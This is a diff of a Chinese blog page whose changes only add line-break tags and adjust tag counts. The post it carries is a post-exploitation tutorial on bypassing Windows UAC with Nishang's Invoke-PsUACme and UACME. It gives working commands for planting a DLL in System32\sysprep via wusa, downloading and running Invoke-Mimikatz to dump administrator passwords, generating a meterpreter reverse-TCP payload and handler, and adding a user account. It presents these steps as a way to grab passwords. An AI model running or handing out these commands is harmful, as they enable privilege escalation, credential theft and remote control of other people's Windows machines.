@@ -253,43 +253,43 @@
 
 <p>我们选择的用以绕过UAC的工具是<a href="https://github.com/hfiref0x/UACME">UACME</a>。这个优秀的工具实现了各种方法，并且值得庆幸的是它是开源的，为此感谢@hFirF0XAs。因为我总是尽量在后期利用阶段都使用PowerShell，所以我测试了UACME，并使用PowerShell实现了其中的一些方法。这里我给出Invoke-PsUACme.ps1文件，你可以在Nishang中的“<a href="https://github.com/samratashok/nishang/tree/master/Escalation">Escalation</a>提权”分类中找到它。</p>
 
-<p>首先，我们以sysprep方法开始，它是绕过UAC最常用的方法，它在2009年由Leo Davidson而出名<a href="http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html">详情</a>。它包括以下步骤：
-step1: 复制DLL文件到C:\Windows\System32\sysprep目录，DLL的名字取决于操作系统版本（1）Windows 7上为CRYPTBASE.dll。
-（2）Windows 8上为shcore.dll。
-step2：从上面的目录执行Sysprep.exe。他将加载上面的DLL，完成权限的提升。
-具体dll名及利用exe如下表：
+<p>首先，我们以sysprep方法开始，它是绕过UAC最常用的方法，它在2009年由Leo Davidson而出名<a href="http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html">详情</a>。它包括以下步骤：<br />
+step1: 复制DLL文件到C:\Windows\System32\sysprep目录，DLL的名字取决于操作系统版本（1）Windows 7上为CRYPTBASE.dll。<br />
+（2）Windows 8上为shcore.dll。<br />
+step2：从上面的目录执行Sysprep.exe。他将加载上面的DLL，完成权限的提升。<br />
+具体dll名及利用exe如下表：<br />
 <img src="http://image.3001.net/images/20151011/14445714412788.jpg" alt="" /></p>
 
 <p>总结了一下突破Windows UAC的方式主要有以下几种：</p>
 
-<p>1、使用IFileOperation COM接口；
-2、使用Wusa.exe的extract选项；
-3、远程注入SHELLCODE 到傀儡进程;
-4、DLL劫持，劫持系统的DLL文件；
-5、直接提权过UAC;
-6、MS15-076(感觉上也可以用到) POC。
-部分方式需要我们将DLL文件拷贝到相应的目录，这里拿Sysprep来做测试，要往这个目录拷贝文件需要管理员的权限，直接copy是不可以的,本文介绍的脚本使用了第二种方式，下面是一个测试。
+<p>1、使用IFileOperation COM接口；<br />
+2、使用Wusa.exe的extract选项；<br />
+3、远程注入SHELLCODE 到傀儡进程;<br />
+4、DLL劫持，劫持系统的DLL文件；<br />
+5、直接提权过UAC;<br />
+6、MS15-076(感觉上也可以用到) POC。<br />
+部分方式需要我们将DLL文件拷贝到相应的目录，这里拿Sysprep来做测试，要往这个目录拷贝文件需要管理员的权限，直接copy是不可以的,本文介绍的脚本使用了第二种方式，下面是一个测试。<br />
 使用copy:</p>
 
 <p><code>C:\UAC&gt;copy evil.dll C:\Windows\System32\sysprep\</code></p>
 
 <p>使用Wusa.exe：</p>
 
-<p>C:&gt; makecab C:\uac\evil.dll C:\uac\uac.cab
+<p>C:&gt; makecab C:\uac\evil.dll C:\uac\uac.cab<br />
 C:&gt; wusa C:\uac\uac.cab /extract:C:\Windows\System32\sysprep</p>
 
 <p>可以看到使用wusa成功拷贝。</p>
 
 <h2 id="0x02-invoke-psuacme">0x02 Invoke-PsUACme</h2>
 
-<p>Invoke-PsUACme 是nishang的一个脚本，该脚本使用了列表中的几个方式来进行bypass UAC，目前支持Win7 ，Win8,由于Win10的wusa extract选项不在受支持，所以此脚本并不适用于Win10。
-该脚本的所使用的DLL来自于开源项目UACME。nishang作者对代码进行了一下简单地修改，这里就不详细说了。
+<p>Invoke-PsUACme 是nishang的一个脚本，该脚本使用了列表中的几个方式来进行bypass UAC，目前支持Win7 ，Win8,由于Win10的wusa extract选项不在受支持，所以此脚本并不适用于Win10。<br />
+该脚本的所使用的DLL来自于开源项目UACME。nishang作者对代码进行了一下简单地修改，这里就不详细说了。<br />
 这里介绍一下脚本的使用,加载脚本：</p>
 
-<p>PS C:\UAC&gt; . .\Invoke-PsUACme.ps1
+<p>PS C:\UAC&gt; . .\Invoke-PsUACme.ps1<br />
 查看说明：</p>
 
-<p>PS C:\UAC&gt; help Invoke-PsUACme
+<p>PS C:\UAC&gt; help Invoke-PsUACme<br />
 主要参数说明：Payload为自定义要执行的程序；method为bypass的方式，包括Sysprep，OOBE，ActionQueue等几种；Verbose显示程序运行过程；CustomDLL64,CustomDLL32可以指定自定义DLL。</p>
 
 <p>执行：</p>
@@ -308,31 +308,31 @@ C:&gt; wusa C:\uac\uac.cab /extract:C:\Windows\System32\sysprep</p>
 
 <h2 id="0x03-能做什么">0x03 能做什么</h2>
 
-<p>1）通过bypass UAC我们可以通过普通的cmd抓到管理员密码。
+<p>1）通过bypass UAC我们可以通过普通的cmd抓到管理员密码。<br />
 普通cmd运行在线抓明文：</p>
 
 <p>powershell IEX (New-Object Net.WebClient).DownloadString(&lsquo;<a href="https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'">https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'</a>); Invoke-Mimikatz</p>
 
 <p>bypass UAC以后：</p>
 
-<p>PS C:\UAC&gt; . .\Invoke-PsUACme.ps1
+<p>PS C:\UAC&gt; . .\Invoke-PsUACme.ps1<br />
 PS C:\UAC&gt; Invoke-PsUACme -Payload &ldquo;powershell -noexit IEX (New-Object Net.WebClient).DownloadString(&lsquo;<a href="https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'">https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'</a>); Invoke-Mimikatz&rdquo;</p>
 
-<p>让meterpreter获得更高的权限。
-生成payload:
-☁  ~  sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=8889 -f psh-reflection
+<p>让meterpreter获得更高的权限。<br />
+生成payload:<br />
+☁  ~  sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=8889 -f psh-reflection<br />
 将输出文件保存为psh.ps1</p>
 
 <p>msf开启监听：</p>
 
-<p>msf &gt; use exploit/multi/handler
-msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
-payload =&gt; windows/meterpreter/reverse_tcp
-msf exploit(handler) &gt; set lhost x.x.x.x
-lhost =&gt; x.x.x.x
-msf exploit(handler) &gt; set lport 8889
-lport =&gt; 8889
-msf exploit(handler) &gt; exploit
+<p>msf &gt; use exploit/multi/handler<br />
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp<br />
+payload =&gt; windows/meterpreter/reverse_tcp<br />
+msf exploit(handler) &gt; set lhost x.x.x.x<br />
+lhost =&gt; x.x.x.x<br />
+msf exploit(handler) &gt; set lport 8889<br />
+lport =&gt; 8889<br />
+msf exploit(handler) &gt; exploit<br />
 普通cmd执行:</p>
 
 <p>bypass UAC 以后执行：</p>
@@ -343,20 +343,20 @@ msf exploit(handler) &gt; exploit
 
 <p>使用方式与nishang不同，并没有回显，使用win10进行测试：</p>
 
-<p>PS F:\drops\UAC&gt; . .\invoke-BypassUAC.ps1
+<p>PS F:\drops\UAC&gt; . .\invoke-BypassUAC.ps1<br />
 PS F:\drops\UAC&gt; invoke-BypassUAC -Command &lsquo;net user 1 &ldquo;Password123!&rdquo; /add&rsquo;</p>
 
 <p>除了上面的脚本，UACME也很好的支持win10,使用方式为：</p>
 
-<p>akagi32.exe 1
-akagi64.exe 3
-akagi32 1 c:\windows\system32\calc.exe
-akagi64 3 c:\windows\system32\cmd.exe
+<p>akagi32.exe 1<br />
+akagi64.exe 3<br />
+akagi32 1 c:\windows\system32\calc.exe<br />
+akagi64 3 c:\windows\system32\cmd.exe<br />
 0x05 小结</p>
 
 <p>绕过UAC能获取更高的权限，你还发愁抓密码么？</p>
 
-<p><a href="http://evi1cg.me/archives/Powershell_Bypass_UAC.html">http://evi1cg.me/archives/Powershell_Bypass_UAC.html</a>
+<p><a href="http://evi1cg.me/archives/Powershell_Bypass_UAC.html">http://evi1cg.me/archives/Powershell_Bypass_UAC.html</a><br />
 <a href="http://www.freebuf.com/articles/system/81286.html">http://www.freebuf.com/articles/system/81286.html</a></p>
 
                       
@@ -524,7 +524,7 @@ akagi64 3 c:\windows\system32\cmd.exe
     
       <li class="cat-item cat-item-1">
         <a rel="nofollow" href="http://blog.pytool.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
-        <small>(13)</small>
+        <small>(14)</small>
       </li>
     
       <li class="cat-item cat-item-1">
@@ -747,6 +747,8 @@ akagi64 3 c:\windows\system32\cmd.exe
       
          <a rel="tag" href="http://blog.pytool.com/tags/imagemagick/" class="tag-link-0" title="1 Posts">imagemagick<small>(2)</small></a>
       
+         <a rel="tag" href="http://blog.pytool.com/tags/index/" class="tag-link-6" title="1 Posts">index<small>(1)</small></a>
+      
          <a rel="tag" href="http://blog.pytool.com/tags/insomnia/" class="tag-link-3" title="1 Posts">insomnia<small>(1)</small></a>
       
          <a rel="tag" href="http://blog.pytool.com/tags/intent/" class="tag-link-5" title="1 Posts">intent<small>(1)</small></a>
@@ -769,7 +771,9 @@ akagi64 3 c:\windows\system32\cmd.exe
       
          <a rel="tag" href="http://blog.pytool.com/tags/js/" class="tag-link-9" title="1 Posts">js<small>(1)</small></a>
       
-         <a rel="tag" href="http://blog.pytool.com/tags/linux/" class="tag-link-6" title="1 Posts">linux<small>(4)</small></a>
+         <a rel="tag" href="http://blog.pytool.com/tags/key/" class="tag-link-8" title="1 Posts">key<small>(1)</small></a>
+      
+         <a rel="tag" href="http://blog.pytool.com/tags/linux/" class="tag-link-6" title="1 Posts">linux<small>(5)</small></a>
       
          <a rel="tag" href="http://blog.pytool.com/tags/linux%E5%91%BD%E4%BB%A4/" class="tag-link-0" title="1 Posts">linux命令<small>(1)</small></a>
       
@@ -801,7 +805,7 @@ akagi64 3 c:\windows\system32\cmd.exe
       
          <a rel="tag" href="http://blog.pytool.com/tags/mtr/" class="tag-link-8" title="1 Posts">mtr<small>(1)</small></a>
       
-         <a rel="tag" href="http://blog.pytool.com/tags/mysql/" class="tag-link-6" title="1 Posts">mysql<small>(6)</small></a>
+         <a rel="tag" href="http://blog.pytool.com/tags/mysql/" class="tag-link-6" title="1 Posts">mysql<small>(7)</small></a>
       
          <a rel="tag" href="http://blog.pytool.com/tags/nessus/" class="tag-link-5" title="1 Posts">nessus<small>(1)</small></a>
       
